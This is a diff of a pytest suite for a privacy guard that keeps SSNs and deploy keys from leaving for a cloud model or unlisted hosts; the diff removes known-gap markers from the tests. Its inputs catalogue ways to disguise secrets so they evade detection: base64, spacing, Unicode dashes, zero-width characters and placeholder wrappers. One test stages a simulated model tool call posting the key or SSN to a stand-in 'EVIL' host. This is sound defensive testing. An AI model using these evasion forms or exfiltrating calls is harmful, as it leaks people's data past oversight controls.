@@ -151,7 +151,6 @@ def test_ssn_plain_forms_stay_off_cloud(presidio, prompt):
     f"Employee SSN {SSN.replace('-', chr(0x2013))}, please file it.",
     "Employee SSN " + "".join(chr(0xFF10 + int(c)) if c.isdigit() else c for c in SSN) + ", please file it.",
 ], ids=["base64", "every-char-spaced", "en-dash", "fullwidth-digits"])
-@gap("R2")
 def test_ssn_reformatted_stays_off_cloud(presidio, prompt):
     _, ports = run_body({"messages": [user(text(prompt))]}, presidio)
     seen = cloud_saw(ports)
@@ -172,7 +171,6 @@ def test_ssn_reformatted_stays_off_cloud(presidio, prompt):
     "912-34.5678",
 ], ids=["unicode-hyphen", "minus-sign", "nbsp", "tab", "zero-width-space", "zero-width-everywhere",
         "fullwidth-dot", "mixed-delimiters"])
-@gap("R2")
 def test_ssn_in_unicode_disguise_stays_local(presidio, form):
     _, ports = run_body({"messages": [user(text(f"Employee SSN {form}, please file it."))]}, presidio)
     assert_stayed_local(ports)
@@ -180,7 +178,7 @@ def test_ssn_in_unicode_disguise_stays_local(presidio, form):
 
 @pytest.mark.parametrize("prompt, form", [
     (f"Deploy key (base64): {b64(KEY)}", b64(KEY)),
-    pytest.param(f"Deploy key: {' '.join(KEY)}", " ".join(KEY), marks=gap("R2")),
+    (f"Deploy key: {' '.join(KEY)}", " ".join(KEY)),
     (f"Deploy key: {KEY[:20]}\u200b{KEY[20:]}", f"{KEY[:20]}\u200b{KEY[20:]}"),
 ], ids=["base64", "every-char-spaced", "zero-width-space"])
 def test_key_reformatted_stays_off_cloud(presidio, prompt, form):
@@ -190,7 +188,6 @@ def test_key_reformatted_stays_off_cloud(presidio, prompt, form):
 
 @pytest.mark.parametrize("form", [KEY[:10] + " " + KEY[10:], KEY[:14] + "\n" + KEY[14:]],
                          ids=["one-space", "line-break"])
-@gap("R2")
 def test_key_broken_by_whitespace_stays_local(presidio, form):
     _, ports = run_body({"messages": [user(text(f"Deploy key: {form}"))]}, presidio)
     assert_stayed_local(ports)
@@ -233,7 +230,6 @@ def test_only_placeholders_this_vault_issued_are_ignored():
     assert [f.value for f in found] == ["[PERSON_2]"]
 
 
-@gap("R2")
 def test_nine_digits_wrapped_in_a_placeholder_shape_stays_local(presidio):
     _, ports = run_body({"messages": [user(text(f"Employee SSN: id [A_{SSN_DIGITS}]"))]}, presidio)
     assert_stayed_local(ports)
@@ -452,7 +448,6 @@ def test_key_to_unlisted_host_forms_is_blocked(presidio, url):
     f"ssn={SSN.replace('-', chr(0x2013))}",
     "ssn=912-34-\u200b5678",
 ], ids=["key-base64", "key-spaced", "ssn-base64", "ssn-en-dash", "ssn-zero-width"])
-@gap("R2")
 def test_reformatted_value_to_unlisted_host_is_blocked(presidio, body):
     out, _ = egress(model_reply(tool_use("http_post", url=EVIL, body=body)), presidio)
     assert_blocked(out)
